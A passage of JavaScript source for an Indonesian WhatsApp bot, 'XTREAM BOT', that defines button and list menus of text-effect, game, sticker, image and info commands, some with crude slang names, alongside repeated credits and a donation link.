🌹 ${prefix}meme
🌹 ${prefix}koala
🌹 ${prefix}bird
🌹 ${prefix}memeindo
🌹 ${prefix}estetikpic
🌹 ${prefix}cium
🌹 ${prefix}hug2
🌹 ${prefix}baka2
🌹 ${prefix}blackpink <text>
🌹 ${prefix}neon <text>
🌹 ${prefix}greenneon <text>
🌹 ${prefix}advanceglow <text>
🌹 ${prefix}futureneon <text>
🌹 ${prefix}sandwriting <text>
🌹 ${prefix}sandsummer <text>
🌹 ${prefix}sandengraved <text>
🌹 ${prefix}metaldark <text>
🌹 ${prefix}neonlight <text>
🌹 ${prefix}holographic <text>
🌹 ${prefix}text1917 <text>
🌹 ${prefix}minion <text>
🌹 ${prefix}deluxesilver <text>
🌹 ${prefix}newyearcard <text>
🌹 ${prefix}bloodfrosted <text>
🌹 ${prefix}halloween <text>
🌹 ${prefix}jokerlogo <text>
🌹 ${prefix}fireworksparkle <text>
🌹 ${prefix}natureleaves <text>
🌹 ${prefix}bokeh <text>
🌹 ${prefix}toxic <text>
🌹 ${prefix}strawberry <text>
🌹 ${prefix}box3d <text>
🌹 ${prefix}roadwarning <text>
🌹 ${prefix}breakwall <text>
🌹 ${prefix}icecold <text>
🌹 ${prefix}luxury <text>
🌹 ${prefix}cloud <text>
🌹 ${prefix}summersand <text>
🌹 ${prefix}horrorblood <text>
🌹 ${prefix}thunder <text>
🌹 ${prefix}pornhub <text>
🌹 ${prefix}avenger <text>
🌹 ${prefix}space <text>
🌹 ${prefix}ninjalogo <text>
🌹 ${prefix}marvelstudio <text>
🌹 ${prefix}lionlogo <text>
🌹 ${prefix}wolflogo <text>
🌹 ${prefix}steel3d <text>
🌹 ${prefix}wallgravity <text>
🌹 ${prefix}cup <text>
🌹 ${prefix}cup1 <text>
🌹 ${prefix}woodenboard <text>
🌹 ${prefix}woodheart <text>
🌹 ${prefix}summer3d <text>
🌹 ${prefix}love <text>
🌹 ${prefix}wolfmetal <text>
🌹 ${prefix}nature3d <text>
🌹 ${prefix}underwater <text>
🌹 ${prefix}golderrose <text>
🌹 ${prefix}summernature <text>
🌹 ${prefix}letterleaves <text>
🌹 ${prefix}glowingneon <text>
🌹 ${prefix}fallleaves <text>
🌹 ${prefix}flamming <text>
🌹 ${prefix}harrypotter <text>
🌹 ${prefix}carvedwood <text>
🌹 ${prefix}arcade8bit <text>
🌹 ${prefix}battlefield4 <text>
🌹 ${prefix}pubg <text>
🌹 ${prefix}bannerlol <text>
🌹 ${prefix}wetglass <text>
🌹 ${prefix}multicolor3d <text>
🌹 ${prefix}watercolor <text>
🌹 ${prefix}luxurygold <text>
🌹 ${prefix}galaxywallpaper <text>
🌹 ${prefix}lighttext <text>
🌹 ${prefix}beautifulflower <text>
🌹 ${prefix}puppycute <text>
🌹 ${prefix}royaltext <text>
🌹 ${prefix}heartshaped <text>
🌹 ${prefix}birthdaycake <text>
🌹 ${prefix}galaxystyle <text>
🌹 ${prefix}hologram3d <text>
🌹 ${prefix}greenneon <text>
🌹 ${prefix}glossychrome <text>
🌹 ${prefix}greenbush <text>
🌹 ${prefix}metallogo <text>
🌹 ${prefix}noeltext <text>
🌹 ${prefix}glittergold <text>
🌹 ${prefix}textcake <text>
🌹 ${prefix}starsnight <text>
🌹 ${prefix}wooden3d <text>
🌹 ${prefix}textbyname <text>
🌹 ${prefix}writegalacy <text>
🌹 ${prefix}galaxybat <text>
🌹 ${prefix}snow3d <text>
🌹 ${prefix}birthdayday <text>
🌹 ${prefix}goldplaybutton <text>
🌹 ${prefix}silverplaybutton <text>
🌹 ${prefix}freefire <text>
🌹 ${prefix}cartoongravity <text>
🌹 ${prefix}anonymhacker <text>
🌹 ${prefix}juventusshirt <text>
🌹 ${prefix}realvintage <text>
🌹 ${prefix}codwarzone <text>
🌹 ${prefix}valorantbanner <text>
🌹 ${prefix}ytkomen <text>
🌹 ${prefix}hartatahta <text>
🌹 ${prefix}hartacustom <text>
🌹 ${prefix}attp <text>
🌹 ${prefix}ttp <text>
🌹 ${prefix}ttp2 <text>
🌹 ${prefix}ttp3 <text>
🌹 ${prefix}ttp4 <text>
🌹 ${prefix}amongus <text>
🌹 ${prefix}carbon <text>
🌹 ${prefix}gtapassed <text>
🌹 ${prefix}shadow <text>
🌹 ${prefix}romantic <text>
🌹 ${prefix}smoke <text>
🌹 ${prefix}burnpaper <text>
🌹 ${prefix}lovemessage <text>
🌹 ${prefix}undergrass <text>
🌹 ${prefix}doubleheart <text>
🌹 ${prefix}coffecup <text>
🌹 ${prefix}coffecup2 <text>
🌹 ${prefix}lovetext <text>
🌹 ${prefix}butterfly <text>
🌹 ${prefix}glitch <text>

 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎: 
®𝐈𝐃𝐎𝐆𝐀𝐍𝐙 [ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ] 
®𝐗𝐭𝐫𝐞𝐚𝐦•𝐛𝐨𝐭 [ 𝐁𝐎𝐓 ] 
®𝐋𝐚𝐰𝐚𝐧𝐏𝐚𝐬𝐮𝐤𝐚𝐧𝐆𝐡𝐨𝐬𝐭 [ 𝐓𝐞𝐚𝐦 ] 
®𝑿𝒇𝒂𝒖𝒛𝒂𝒏 [ 𝑭𝑹𝑰𝑬𝑵𝑫𝑺 ]
®𝐉𝐮𝐚𝐧𝐋𝐮𝐜𝐢𝐯𝐞𝐫 [ 𝐌𝐚𝐬𝐭𝐚𝐡 ] 
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕

  ꪶ𖣂ꫂ IDO ボ GANZ 〽 @idoganz`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}


               prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          client.relayWAMessage(prep)
               break;
      case 'gamemenu':
        case  'menugame':
        menu =`ꪶ𖣂ꫂXTREAM BOTぽ 以 `

               buttons =  [
    {buttonId: `${prefix}stickermenu`, buttonText: {displayText: 'STICKER MENU'}, type: 1},
]
               imageMsg = (await client.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:fake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   
▢ 𝐎𝐰𝐧𝐞𝐫 : 𝐈𝐝𝐨𝐠𝐚𝐧𝐳𝟏
▢ 𝐁𝐨𝐭 :  𝐗𝐭𝐫𝐞𝐚𝐦|𝐛𝐨𝐭
▢ 𝐏𝐫𝐞𝐟𝐢𝐱 :  𝐀𝐥𝐥 𝐏𝐫𝐞𝐟𝐢𝐱 / 𝐧𝐨𝐩𝐫𝐞𝐟
▢ 𝐒𝐄𝐋𝐅 / 𝐏𝐔𝐁𝐋𝐈𝐂
▢ 𝐃𝐨𝐧𝐚𝐬𝐢 : https://saweria.co/idoganz1
   
𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
   
🌹 ${prefix}tebakgambar
🌹 ${prefix}tebakgambar3
🌹 ${prefix}tebakliriklagu
🌹 ${prefix}tebakkimia
🌹 ${prefix}family1002
🌹 ${prefix}caklontong
🌹 ${prefix}tebakbendera
🌹 ${prefix}soalmtk
🌹 ${prefix}rate
🌹 ${prefix}watak
🌹 ${prefix}hobi
🌹 ${prefix}jadian
🌹 ${prefix}bisakah
🌹 ${prefix}kapankah
🌹 ${prefix}apakah
🌹 ${prefix}bagaimanakah
🌹 ${prefix}truth
🌹 ${prefix}dare
🌹 ${prefix}heleh
🌹 ${prefix}hilih
🌹 ${prefix}cekmati
🌹 ${prefix}gantengcek  
🌹 ${prefix}cantikcek  
🌹 ${prefix}jelekcek  
🌹 ${prefix}goblokcek  
🌹 ${prefix}begocek  
🌹 ${prefix}pintercek  
🌹 ${prefix}jagocek  
🌹 ${prefix}nolepcek  
🌹 ${prefix}babicek  
🌹 ${prefix}bebancek  
🌹 ${prefix}baikcek  
🌹 ${prefix}jahatcek  
🌹 ${prefix}anjingcek  
🌹 ${prefix}haramcek  
🌹 ${prefix}kontolcek  
🌹 ${prefix}pakboycek  
🌹 ${prefix}pakgirlcek  
🌹 ${prefix}sangecek  
🌹 ${prefix}bapercek 

 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎: 
®𝐈𝐃𝐎𝐆𝐀𝐍𝐙 [ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ] 
®𝐗𝐭𝐫𝐞𝐚𝐦•𝐛𝐨𝐭 [ 𝐁𝐎𝐓 ] 
®𝐋𝐚𝐰𝐚𝐧𝐏𝐚𝐬𝐮𝐤𝐚𝐧𝐆𝐡𝐨𝐬𝐭 [ 𝐓𝐞𝐚𝐦 ] 
®𝑿𝒇𝒂𝒖𝒛𝒂𝒏 [ 𝑭𝑹𝑰𝑬𝑵𝑫𝑺 ]
®𝐉𝐮𝐚𝐧𝐋𝐮𝐜𝐢𝐯𝐞𝐫 [ 𝐌𝐚𝐬𝐭𝐚𝐡 ]
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕

 ️ꪶ𖣂ꫂ IDO ボ GANZ 〽 @idoganz1`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}


               prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          client.relayWAMessage(prep)
               break;
               case 'stickermenu':
        case  'stikermenu':
        menu =`ꪶ𖣂ꫂXTREAM BOTぽ 以 `

               buttons =  [
    {buttonId: `${prefix}funmenu`, buttonText: {displayText: 'FUN MENU'}, type: 1},
]
               imageMsg = (await client.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:fake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   
▢ 𝐎𝐰𝐧𝐞𝐫 : 𝐈𝐝𝐨𝐠𝐚𝐧𝐳𝟏
▢ 𝐁𝐨𝐭 :  𝐗𝐭𝐫𝐞𝐚𝐦|𝐛𝐨𝐭
▢ 𝐏𝐫𝐞𝐟𝐢𝐱 :  𝐀𝐥𝐥 𝐏𝐫𝐞𝐟𝐢𝐱 / 𝐧𝐨𝐩𝐫𝐞𝐟
▢ 𝐒𝐄𝐋𝐅 / 𝐏𝐔𝐁𝐋𝐈𝐂
▢ 𝐃𝐨𝐧𝐚𝐬𝐢 : https://saweria.co/idoganz1
    
𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
   
🌹 ${prefix}dadu
🌹️ ${prefix}doge
🌹️ ${prefix}toimg
🌹 ${prefix}patrick
🌹 ${prefix}garwgura
🌹️ ${prefix}ttg 
🌹️ ${prefix}attp
🌹 ${prefix}stickeranime
🌹 ${prefix}semoji _emoji_
🌹 ${prefix}sticker 
🌹️ ${prefix}smeme teks|teks_
🌹 ${prefix}swm
🌹 ${prefix}take
🌹 ${prefix}tovideo _reply sgif_
🌹 ${prefix}tomp3
🌹 ${prefix}tomp4
🌹 ${prefix}togif

 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎: 
®𝐈𝐃𝐎𝐆𝐀𝐍𝐙 [ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ] 
®𝐗𝐭𝐫𝐞𝐚𝐦•𝐛𝐨𝐭 [ 𝐁𝐎𝐓 ] 
®𝐋𝐚𝐰𝐚𝐧𝐏𝐚𝐬𝐮𝐤𝐚𝐧𝐆𝐡𝐨𝐬𝐭 [ 𝐓𝐞𝐚𝐦 ] 
®𝑿𝒇𝒂𝒖𝒛𝒂𝒏 [ 𝑭𝑹𝑰𝑬𝑵𝑫𝑺 ]
®𝐉𝐮𝐚𝐧𝐋𝐮𝐜𝐢𝐯𝐞𝐫 [ 𝐌𝐚𝐬𝐭𝐚𝐡 ] 
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕

 ꪶ𖣂ꫂ IDO ボ GANZ 〽 @idoganz1`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}


               prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          client.relayWAMessage(prep)
               break
                    case 'funmenu':
        case  'menufun':
      menu =`XTREAM BOTぽ 以 `

               buttons =  [
    {buttonId: `${prefix}infomenu`, buttonText: {displayText: 'INFO MENU'}, type: 1},
]
               imageMsg = (await client.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:fake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   
▢ 𝐎𝐰𝐧𝐞𝐫 : 𝐈𝐝𝐨𝐠𝐚𝐧𝐳𝟏
▢ 𝐁𝐨𝐭 :  𝐗𝐭𝐫𝐞𝐚𝐦|𝐛𝐨𝐭
▢ 𝐏𝐫𝐞𝐟𝐢𝐱 :  𝐀𝐥𝐥 𝐏𝐫𝐞𝐟𝐢𝐱 / 𝐧𝐨𝐩𝐫𝐞𝐟
▢ 𝐒𝐄𝐋𝐅 / 𝐏𝐔𝐁𝐋𝐈𝐂
▢ 𝐃𝐨𝐧𝐚𝐬𝐢 : https://saweria.co/idoganz1
    
𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
   
🌹 ${prefix}wanted
🌹 ${prefix}facebookpage
🌹 ${prefix}costumwp
🌹 ${prefix}pantaimalam
🌹 ${prefix}trigger
🌹 ${prefix}putin
🌹 ${prefix}gay
🌹 ${prefix}gay2
🌹 ${prefix}komunis
🌹 ${prefix}hitler
🌹 ${prefix}captcha
🌹 ${prefix}policeline
🌹 ${prefix}continued
🌹 ${prefix}rip
🌹 ${prefix}glass
🌹 ${prefix}discord
🌹 ${prefix}invert
🌹 ${prefix}asupan
🌹 ${prefix}asupanbocil
🌹 ${prefix}asupanukhty
🌹 ${prefix}asupanghea
🌹 ${prefix}cewek
🌹 ${prefix}cogan
🌹 ${prefix}cantik
🌹 ${prefix}cowok
🌹 ${prefix}asupansantuy
🌹 ${prefix}fotocecan
🌹 ${prefix}fotoukhty
🌹 ${prefix}wallpaperteknologi
🌹 ${prefix}wallpapercyber
🌹 ${prefix}walpaperprograming
🌹 ${prefix}asupanrika

 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎: 
®𝐈𝐃𝐎𝐆𝐀𝐍𝐙 [ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ] 
®𝐗𝐭𝐫𝐞𝐚𝐦•𝐛𝐨𝐭 [ 𝐁𝐎𝐓 ] 
®𝐋𝐚𝐰𝐚𝐧𝐏𝐚𝐬𝐮𝐤𝐚𝐧𝐆𝐡𝐨𝐬𝐭 [ 𝐓𝐞𝐚𝐦 ] 
®𝑿𝒇𝒂𝒖𝒛𝒂𝒏 [ 𝑭𝑹𝑰𝑬𝑵𝑫𝑺 ]
®𝐉𝐮𝐚𝐧𝐋𝐮𝐜𝐢𝐯𝐞𝐫 [ 𝐌𝐚𝐬𝐭𝐚𝐡 ]
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕

 ️ꪶ𖣂ꫂ IDO ボ GANZ 〽 @idoganz1`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}


               prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          client.relayWAMessage(prep)
               break;
   case 'infomenu':
        case  'menuinfo':
      menu =`XTREAM BOTぽ 以 `

               buttons =  [
    {buttonId: `${prefix}cecanmenu`, buttonText: {displayText: 'CECAN MENU'}, type: 1},
]
               imageMsg = (await client.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:fake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `                 
▢ 𝐎𝐰𝐧𝐞𝐫 : 𝐈𝐝𝐨𝐠𝐚𝐧𝐳𝟏
▢ 𝐁𝐨𝐭 :  𝐗𝐭𝐫𝐞𝐚𝐦|𝐛𝐨𝐭
▢ 𝐏𝐫𝐞𝐟𝐢𝐱 :  𝐀𝐥𝐥 𝐏𝐫𝐞𝐟𝐢𝐱 / 𝐧𝐨𝐩𝐫𝐞𝐟
▢ 𝐒𝐄𝐋𝐅 / 𝐏𝐔𝐁𝐋𝐈𝐂
▢ 𝐃𝐨𝐧𝐚𝐬𝐢 : https://saweria.co/idoganz1
    
𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
   
🌹 ${prefix}update
🌹 ${prefix}level
🌹 ${prefix}listsewa
🌹 ${prefix}sourcecode
🌹 ${prefix}profile
🌹 ${prefix}waktu
🌹 ${prefix}botstat
🌹 ${prefix}rules
🌹 ${prefix}sewabot
🌹 ${prefix}leaderboard
🌹 ${prefix}owner
🌹 ${prefix}ping
🌹 ${prefix}runtime
🌹 ${prefix}donasi
🌹 ${prefix}bugreport keluhan

 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎: 
®𝐈𝐃𝐎𝐆𝐀𝐍𝐙 [ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ] 
®𝐗𝐭𝐫𝐞𝐚𝐦•𝐛𝐨𝐭 [ 𝐁𝐎𝐓 ] 
®𝐋𝐚𝐰𝐚𝐧𝐏𝐚𝐬𝐮𝐤𝐚𝐧𝐆𝐡𝐨𝐬𝐭 [ 𝐓𝐞𝐚𝐦 ] 
®𝑿𝒇𝒂𝒖𝒛𝒂𝒏 [ 𝑭𝑹𝑰𝑬𝑵𝑫𝑺 ]
®𝐉𝐮𝐚𝐧𝐋𝐮𝐜𝐢𝐯𝐞𝐫 [ 𝐌𝐚𝐬𝐭𝐚𝐡 ] 
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕

 ꪶ𖣂ꫂ IDO ボ GANZ 〽 @idoganz1`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}


               prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          client.relayWAMessage(prep)
               break;
   case 'cecanmenu':
        case  'cecanmenu':
   menu =` XTREAM BOTぽ 以 `

               buttons =  [
    {buttonId: `${prefix}asupanmenu`, buttonText: {displayText: 'ASUPAN MENU'}, type: 1},
]
               imageMsg = (await client.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:fake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `                 
▢ 𝐎𝐰𝐧𝐞𝐫 : 𝐈𝐝𝐨𝐠𝐚𝐧𝐳𝟏
▢ 𝐁𝐨𝐭 :  𝐗𝐭𝐫𝐞𝐚𝐦|𝐛𝐨𝐭
▢ 𝐏𝐫𝐞𝐟𝐢𝐱 :  𝐀𝐥𝐥 𝐏𝐫𝐞𝐟𝐢𝐱 / 𝐧𝐨𝐩𝐫𝐞𝐟
▢ 𝐒𝐄𝐋𝐅 / 𝐏𝐔𝐁𝐋𝐈𝐂
▢ 𝐃𝐨𝐧𝐚𝐬𝐢 : https://saweria.co/idoganz1
    
𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
   
🌹  ${prefix}japan
🌹  ${prefix}thailand
🌹  ${prefix}malaysia
🌹  ${prefix}vietnam
🌹  ${prefix}china
🌹  ${prefix}japan
🌹  ${prefix}indonesia
🌹  ${prefix}korea

 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎: 
®𝐈𝐃𝐎𝐆𝐀𝐍𝐙 [ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ] 
®𝐗𝐭𝐫𝐞𝐚𝐦•𝐛𝐨𝐭 [ 𝐁𝐎𝐓 ] 
®𝐋𝐚𝐰𝐚𝐧𝐏𝐚𝐬𝐮𝐤𝐚𝐧𝐆𝐡𝐨𝐬𝐭 [ 𝐓𝐞𝐚𝐦 ] 
®𝑿𝒇𝒂𝒖𝒛𝒂𝒏 [ 𝑭𝑹𝑰𝑬𝑵𝑫𝑺 ]
®𝐉𝐮𝐚𝐧𝐋𝐮𝐜𝐢𝐯𝐞𝐫 [ 𝐌𝐚𝐬𝐭𝐚𝐡 ] 
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕

 ️ꪶ𖣂ꫂ IDO ボ GANZ 〽 @idoganz1`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}


               prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
              client.relayWAMessage(prep)
               break;
              case 'asupanmenu':
        case  'asupanmenu':
   menu =` XTREAM BOTぽ 以 `

               buttons =  [
    {buttonId: `${prefix}groupmenu`, buttonText: {displayText: 'GROUP MENU'}, type: 1},
]
               imageMsg = (await client.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:fake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `                 
▢ 𝐎𝐰𝐧𝐞𝐫 : 𝐈𝐝𝐨𝐠𝐚𝐧𝐳𝟏
▢ 𝐁𝐨𝐭 :  𝐗𝐭𝐫𝐞𝐚𝐦|𝐛𝐨𝐭
▢ 𝐏𝐫𝐞𝐟𝐢𝐱 :  𝐀𝐥𝐥 𝐏𝐫𝐞𝐟𝐢𝐱 / 𝐧𝐨𝐩𝐫𝐞𝐟
▢ 𝐒𝐄𝐋𝐅 / 𝐏𝐔𝐁𝐋𝐈𝐂
▢ 𝐃𝐨𝐧𝐚𝐬𝐢 : https://saweria.co/idoganz1
    
𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
  
🌹 ${prefix}asupan
🌹 ${prefix}asupanbocil
🌹 ${prefix}asupanukhty
🌹 ${prefix}asupanghea
🌹 ${prefix}cewek
🌹 ${prefix}cowok
🌹 ${prefix}asupansantuy
🌹 ${prefix}fotocecan
🌹 ${prefix}fotoukhty
🌹 ${prefix}asupanrika
🌹 ${prefix}asupanhijaber

𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎: 
®𝐈𝐃𝐎𝐆𝐀𝐍𝐙 [ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ] 
®𝐗𝐭𝐫𝐞𝐚𝐦•𝐛𝐨𝐭 [ 𝐁𝐎𝐓 ] 
®𝐋𝐚𝐰𝐚𝐧𝐏𝐚𝐬𝐮𝐤𝐚𝐧𝐆𝐡𝐨𝐬𝐭 [ 𝐓𝐞𝐚𝐦 ] 
®𝑿𝒇𝒂𝒖𝒛𝒂𝒏 [ 𝑭𝑹𝑰𝑬𝑵𝑫𝑺 ]
®𝐉𝐮𝐚𝐧𝐋𝐮𝐜𝐢𝐯𝐞𝐫 [ 𝐌𝐚𝐬𝐭𝐚𝐡 ] 
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕

 ️ꪶ𖣂ꫂ IDO ボ GANZ 〽 @idoganz1`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}


               prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
              client.relayWAMessage(prep)
               break; 
         case 'menu3':
        case 'help3':
               list = []
               listmenu = [`group menu`,`wibu menu`,`sticker menu`,`owner menu`,`game menu`,`fun menu`,`download menu`,`info menu`,`other menu`,`cecan menu`,`asupan menu`,`owner`,`xtream group`,`sewa bot`]               
               listmenuu = [`${prefix}groupmenu`,`${prefix}wibumenu`,`${prefix}stickermenu`,`${prefix}ownermenu`,`${prefix}gamemenu`,`${prefix}funmenu`,`${prefix}downloadmenu`,`${prefix}infomenu`,`${prefix}othermenu`,`${prefix}cecanmenu`,`${prefix}asupanmenu`,`${prefix}owner`,`${prefix}sourcecode`,`${prefix}xtreamgroup`,`Rent this Bot`]
               nombor = 1
               startnum = 0
               for (let x of listmenu) {
               const yy = {title: 'Sub-Menu Ke-' + nombor++,
                    rows: [
                       {
                        title: `${listmenuu[startnum++]}`,
                        description: ``,
                        rowId: `${prefix}${x}`
                      }
                    ]
                   }
                        list.push(yy)
           }
               listmsg(from, `Hai Kak😎 ${pushname}
               ꪶ𖣂ꫂXTREAM BOTぽ 以 `,
`
▢ 𝐎𝐰𝐧𝐞𝐫 : 𝐈𝐝𝐨𝐠𝐚𝐧𝐳𝟏
▢ 𝐁𝐨𝐭 :  𝐗𝐭𝐫𝐞𝐚𝐦|𝐛𝐨𝐭
▢ 𝐏𝐫𝐞𝐟𝐢𝐱 :  𝐀𝐥𝐥 𝐏𝐫𝐞𝐟𝐢𝐱 / 𝐧𝐨𝐩𝐫𝐞𝐟
▢ 𝐒𝐄𝐋𝐅 / 𝐏𝐔𝐁𝐋𝐈𝐂
▢ 𝐃𝐨𝐧𝐚𝐬𝐢 : https://saweria.co/idoganz1

𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎: 
®𝐈𝐃𝐎𝐆𝐀𝐍𝐙 [ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ] 
®𝐗𝐭𝐫𝐞𝐚𝐦•𝐛𝐨𝐭 [ 𝐁𝐎𝐓 ] 
®𝐋𝐚𝐰𝐚𝐧𝐏𝐚𝐬𝐮𝐤𝐚𝐧𝐆𝐡𝐨𝐬𝐭 [ 𝐓𝐞𝐚𝐦 ] 
®𝑿𝒇𝒂𝒖𝒛𝒂𝒏 [ 𝑭𝑹𝑰𝑬𝑵𝑫𝑺 ]
®𝐉𝐮𝐚𝐧𝐋𝐮𝐜𝐢𝐯𝐞𝐫 [ 𝐌𝐚𝐬𝐭𝐚𝐡 ]
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕

ꪶ𖣂ꫂ IDO ボ GANZ 〽`, list)
               break;
               case 'menu2':
               case 'help2': 
                let ido = client.prepareMessageFromContent(from, {
           "listMessage": {
						"title":  `hai babu😎 ${pushname}`,
						"description": `𝑳𝒊𝒔𝒕 𝒎𝒆𝒏𝒖 𝒃𝒐𝒕 𝒂𝒅𝒂 𝒅𝒊𝒔𝒊𝒏𝒊 𝒌𝒂𝒌 𝒔𝒊𝒍𝒂𝒉𝒌𝒂𝒏 𝒅𝒊 𝒑𝒊𝒍𝒊𝒉`,
						"buttonText": "SELECT HERE",
						"footerText": `ꪶ𖣂ꫂ ボ 𝑰𝒅𝒐𝒈𝒂𝒏𝒛 〽`,
						"listType": "SINGLE_SELECT",
						"sections": [
						{
								"title": "◉ Menu ke 2",
								"rows": [
									{
										"title": ".menu2",
										"description": "\n\n_choose this if you want to use the menu2 command_",
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu khusus group",
								"rows": [
									{
										"title": ".groupmenu",
										"description": "\n\n_choose this if you want to use the groupmenu command_",
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu khusus owner",
								"rows": [
									{
										"title": ".ownermenu",
										"description": "\n\n_choose this if you want to use the ownermenu command_",
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu khusus fun",
								"rows": [
									{
										"title": ".funmenu",
										"description": "\n\n_choose this if you want to use the funmenu command_",
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu khusus asupan",
								"rows": [
									{
										"title": ".asupanmenu",
										"description": "\n\n_choose this if you want to use the asupanmenu command_",
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu khusus cecan",
								"rows": [
									{
										"title": ".cecanmenu",
										"description": "\n\n_choose this if you want to use the cecanmenu command_",
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu khusus sticker",
								"rows": [
									{
										"title": ".stickermenu",
										"description": "\n\n_choose this if you want to use the stickermenu command_",
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu khusus other",
								"rows": [
									{
										"title": ".othermenu",
										"description": "\n\n_choose this if you want to use the othermenu command_",
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu khusus game",
								"rows": [
									{
										"title": ".gamemenu",
										"description": "\n\n_choose this if you want to use the gamemenu command_",
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu info",
								"rows": [
									{
										"title": ".infomenu",
										"description": "\n\n_choose this if you want to use the info menu command_",
										"rowId": "0"
									}]},																												
							{
								"title": "◉ Menu wibu",
								"rows": [
									{
										"title": ".wibumenu",
										"description": "\n\n_choose this if you want to use the wibumenu command_",
										"rowId": "0"
									}]},
							{
								"title": "◉ Menu download",
								"rows": [
									{
										"title": ".downloadmenu",
										"description": "\n\n_choose this if you want to use the download menu command_",
										"rowId": "0"
									}]},							
							{
								"title": "◉ Source script bot",
								"rows": [
									{
										"title": ".sourcecode",
